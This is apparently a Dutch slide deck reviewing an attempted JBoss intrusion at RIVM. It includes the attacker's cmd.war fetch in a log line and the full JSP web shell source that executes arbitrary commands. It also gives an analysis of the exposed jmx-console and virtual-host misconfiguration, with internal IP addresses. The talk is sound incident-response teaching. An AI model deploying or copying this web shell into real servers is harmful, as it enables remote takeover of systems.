@@ -1,0 +1,248 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-US">
+<head>
+<meta name="generator"
+	content="HTML Slidy, see www.w3.org" />
+<title>De Jboss net-niet hack</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="copyright"
+	content="Copyright &#169; 2005-2010 W3C (MIT, ERCIM, Keio)" />
+<meta name="duration" content="20" />
+<meta name="font-size-adjustment" content="-2" />
+<link rel="stylesheet" href="styles/slidy.css" type="text/css" />
+<link rel="stylesheet" href="styles/w3c-blue.css" type="text/css" />
+<script src="scripts/slidy.js" charset="utf-8" type="text/javascript">
+	
+</script>
+</head>
+<body>
+	<div class="background">
+		<img alt="" id="head-icon" src="graphics/icon-blue.png" />
+<!-- 		<object id="head-logo" data="graphics/w3c-logo-white.svg" -->
+<!-- 			type="image/svg+xml" title="W3C logo"> -->
+<!-- 			<a href="http://www.w3.org/"><img alt="W3C logo" -->
+<!-- 				id="head-logo-fallback" src="graphics/w3c-logo-white.gif" /></a> -->
+<!-- 		</object> -->
+	</div>
+
+	<div class="background slanty">
+		<img src="graphics/w3c-logo-slanted.jpg" alt="slanted W3C logo" />
+	</div>
+	<div class="slide cover title">
+		<!-- hidden style graphics to ensure they are saved with other content -->
+		<img class="hidden" src="graphics/bullet.png" alt="" /> <img
+			class="hidden" src="graphics/fold.gif" alt="" /> <img class="hidden"
+			src="graphics/unfold.gif" alt="" /> <img class="hidden"
+			src="graphics/fold-dim.gif" alt="" /> <img class="hidden"
+			src="graphics/nofold-dim.gif" alt="" /> <img class="hidden"
+			src="graphics/unfold-dim.gif" alt="" /> <img class="hidden"
+			src="graphicsy/bullet-fold.gif" alt="" /> <img class="hidden"
+			src="graphics/bullet-unfold.gif" alt="" /> <img class="hidden"
+			src="graphics/bullet-fold-dim.gif" alt="" /> <img class="hidden"
+			src="graphics/bullet-nofold-dim.gif" alt="" /> <img class="hidden"
+			src="graphics/bullet-unfold-dim.gif" alt="" />
+<!-- 			<img src="graphics/keys2.jpg" alt="Cover page images (keys)" class="cover" /> -->
+			<br	clear="all" />
+		<h1>De Jboss net-niet hack: kroniek van knulligheden</h1>
+
+		<p>
+			<a href="mailto:ger-jan.te.dorsthorst@rivm.nl">ger-jan.te.dorsthorst@rivm.nl</a>
+			<br /> <br /> <br /> <br /><br />
+<!-- 			<em>Spatie om verder te gaan</em> -->
+		</p>
+	</div>
+
+	<div class="slide">
+		<h1>Inhoud</h1>
+		<ul>
+			<li>Betrokken servers en daemons</li>
+			<li>Demo remote deployment</li>
+			<li>Kroniek van knulligheden</li>
+		</ul>
+	</div>
+	
+	<div class="slide">
+		<h1>Reverse proxy en webl0{1,2}-ext-p</h1>
+		<div style= "margin-left: 4em; position: relative;">
+			<img src="graphics/revproxy+webl0n.jpg" alt="revproxy+webl0n.jpg" height="600" width="800"/>
+		</div>
+	</div>
+	
+	<div class="slide">
+		<h1>Apache en Jboss</h1>
+		<div style= "margin-left: 4em; position: relative;">
+			<img src="graphics/apache+jboss.jpg" alt="apache+jboss.jpg" height="600" width="800"/>
+		</div>
+	</div>
+	
+	<div class="slide">
+		<h1>Demo remote deployment</h1>
+		<ul>
+			<li>Command processor</li>
+			<li>Reverse shell</li>
+		</ul>
+	</div>
+
+	<div class="slide">
+		<h1>Chronologie gebeurtenissen</h1>
+		<p>Spot de knulligheden!</p>
+		<ul class="incremental">
+			<li>Melding hoge load webl01-ext-p ontvangen</li>
+			<li>Server.log Jboss gecheckt (wat als top was gebruikt?)</li>
+			<li>Verdachte URL gevonden (wat als ip-nummer was gebruikt?)		
+<pre>
+2012-03-14 14:20:05,178 WARN  [org.jboss.system.server.profileservice.hotdeploy.HDScanner] (HDScanner) Scan failed
+java.io.IOException: No context factory for http://www.liverichcostarica.com/typo3conf/cmd.war
+</pre>
+			</li>
+		</ul>
+	</div>
+
+	<div class="slide">
+		<h1>Chronologie, vervolg</h1>
+		<ul class="incremental">
+			<li>Cmd.war gedownload
+<pre>
+&lt;%@ page import="java.util.*,java.io.*"%&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+Commands with JSP
+&lt;FORM METHOD="GET" NAME="myform" ACTION=""&gt;
+&lt;INPUT TYPE="text" NAME="cmd"&gt;
+&lt;INPUT TYPE="submit" VALUE="Send"&gt;
+&lt;/FORM&gt;
+&lt;pre&gt;
+&lt;%
+if (request.getParameter("cmd") != null) {
+out.println("Command: " + request.getParameter("cmd") + "&lt;BR&gt;");
+Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+OutputStream os = p.getOutputStream();
+InputStream in = p.getInputStream();
+DataInputStream dis = new DataInputStream(in);
+String disr = dis.readLine();
+while ( disr != null ) {
+out.println(disr);
+disr = dis.readLine();
+}
+}
+%&gt;
+&lt;/pre&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+</pre>
+			</li>
+			<li>Duidelijk: dit wil je niet op je server!</li>
+		</ul>
+	</div>
+
+	<div class="slide">
+		<h1>Chronologie, vervolg</h1>
+		<ul class="incremental">
+			<li>Deployen mogelijk via jmx-console (niet secured, niet in gebruik, maar alleen - echt waar! toch? - bereikbaar via 127.0.0.1...)</li>
+			<li>Mislukken deployment door bug in Jboss 5.1.0.GA (gered door een bug...)
+<pre>
+https://issues.jboss.org/browse/JBAS-8319
+[Regression in JBoss 5.x and 6.x compared to 4.x] VFS doesn't support fetching http resources
+</pre>
+			</li>
+			<li>Geen subsequente requests voor cmd.jsp in access log gevonden (gered door onge&iuml;nteresseerde? luie? incompetente? hacker...)</li>
+			<li>In totaal op webl0{1,2}-ext-p 4 vergelijkbare wars gevonden (oudste: oktober 2011...)</li>
+		</ul>
+	</div>
+
+	<div class="slide">
+		<h1>Chronologie, vervolg</h1>
+		<ul class="incremental">
+			<li>Daarna: veel tijd en energie in beperking toegang systemen. Onterechte aanname dat deployen alleen van localhost kan!</li>
+			<li>Dan: ontdekking request naar 131.224.244.71/jmx-console door TR en Dimension Data (bij test van IDS/IPS, toevallig dezelfde week...)</li>
+			</li>
+		</ul>
+	</div>
+
+	<div class="slide">
+		<h1>Analyse</h1>
+		<ul class="incremental">
+			<li>Jboss heeft in de server.xml van jbossweb.sar (= Tomcat) een aantal virtual hosts (element Host in server.xml) staan, o.a. www.rivm.nl en www.perinataleaudit.nl. Dit is om dezelfde Tomcat instance (element Engine, waarvan Host elems sub-elements zijn) beide sites te kunnen hosten als separate webapps en toch de URL space van die sites met allebei met / te kunnen laten starten.</li>
+			<li>In de webapp w_rivm.war staat een file jboss-web.xml met daarin:			
+<pre>
+&lt;jboss-web&gt;
+  &lt;context-root&gt;/&lt;/context-root&gt;
+  &lt;virtual-host&gt;www.rivm.nl&lt;/virtual-host&gt;
+...
+&lt;/jboss-web&gt; 
+</pre>
+			</li>
+			<li>en in de webapp w_pars.war staat een gelijknamige file met:
+<pre>
+&lt;jboss-web&gt;
+  &lt;context-root&gt;/&lt;/context-root&gt;
+  &lt;virtual-host&gt;www.perinataleaudit.nl&lt;/virtual-host&gt;
+&lt;/jboss-web&gt;
+</pre>
+			</li>
+		</ul>
+	</div>
+
+	<div class="slide">
+		<h1>Analyse, vervolg</h1>
+		<ul class="incremental">
+			<li>Door de host URL in de request te matchen met de adressen in zijn virtual hosts, die via bovenstaande configuratiefiles weer zijn gekoppeld aan de verschillende webapps, kan Tomcat de request naar de juist webapp sturen.</li>
+			<li>Nu kent een host element een aantal aliassen. Bij www.rivm.nl zijn dat bijvoorbeeld:			
+<pre>
+&lt;Alias&gt;www&lt;/Alias&gt;
+&lt;Alias&gt;rivm.nl&lt;/Alias&gt;
+&lt;Alias&gt;w-rivm-1.rivm.nl&lt;/Alias&gt;
+&lt;Alias&gt;w-rivm-1&lt;/Alias&gt;
+&lt;Alias&gt;w-rivm-2.rivm.nl&lt;/Alias&gt;
+&lt;Alias&gt;w-rivm-2&lt;/Alias&gt;
+&lt;Alias&gt;131.224.252.118&lt;/Alias&gt;
+&lt;Alias&gt;131.224.252.117&lt;/Alias&gt;
+&lt;Alias&gt;131.224.244.82&lt;/Alias&gt;
+</pre>
+			</li>
+			<li>Bij www.perinataleaudit.nl zijn dit de aliassen:
+<pre>
+&lt;Alias&gt;perinataleaudit.nl&lt;/Alias&gt;
+&lt;Alias&gt;perinataleaudit.eu&lt;/Alias&gt;
+&lt;Alias&gt;www.perinataleaudit.eu&lt;/Alias&gt;
+&lt;Alias&gt;w-pars-1.rivm.nl&lt;/Alias&gt;
+&lt;Alias&gt;w-pars-1&lt;/Alias&gt;
+&lt;Alias&gt;w-pars-2.rivm.nl&lt;/Alias&gt;
+&lt;Alias&gt;w-pars-2&lt;/Alias&gt;
+&lt;Alias&gt;131.224.252.123&lt;/Alias&gt;
+&lt;Alias&gt;131.224.252.124&lt;/Alias&gt;
+</pre>
+			</li>
+		</ul>
+	</div>
+	
+	<div class="slide">
+		<h1>Analyse, vervolg</h1>
+		<ul class="incremental">
+			<li>Wat als op de een of andere manier een request binnenkomt die niet met een van deze aliassen matcht?</li>
+			<li>Tomcat eist dat je precies 1 host als defaultHost aanmerkt, waarvan de naam moet matchen met het defaultHost attribute van het Engine element:			
+<pre>
+Exactly one of the Hosts associated with each Engine MUST have a name matching the defaultHost attribute of that Engine
+(http://tomcat.apache.org/tomcat-5.5-doc/config/host.html)
+</pre>
+			</li>
+			<li>In de server.xml op webl0n-ext-p.rivm.nl is de defaultHost localhost. Omdat daarin op context / de ROOT.war van Jboss draait krijg een fraai Jboss-scherm te zien als je zo'n request doet die niet door een alias wordt gematcht (maar die op een of andere manier wel op deze server terecht komt).</li>
+			<li>Zijn er dan zulke requests? Ja! 131.224.244.71, het externe adres van www.perinataleaudit.nl is er zo een. Je ziet dat het externe adres van www.rivm.nl (het vetgedrukte IP-nummer) wel netjes bij de aliassen van die virtual host is gezet, maar dat het corresponderende adres van pars ontbreekt.</li>
+			</li>
+		</ul>
+	</div>
+	
+	<div class="slide">
+		<h1>Nagekomen knulligheid</h1>
+		<ul class="incremental">
+			<li>RO: Ik zie het woord "perinataleaudit" en denk "die heb ik eerder gezien". Het domein perinataleaudit.nl wordt niet meer bij RIVM gehost, en het IP adres www.perinataleaudit.nl verwijst ook niet meer naar adres uit het RIVM blok.</li>
+			<li>Lastig te verdedigen: een lek in je webserver veroorzaakt door een site die je niet eens meer host :-/</li>
+		</ul>
+	</div>
+	
+	<div class="slide">
+		<h1>Slot</h1>
+		<p>Vragen/Discussie</p>
+	</div>
+</body>
+</html>
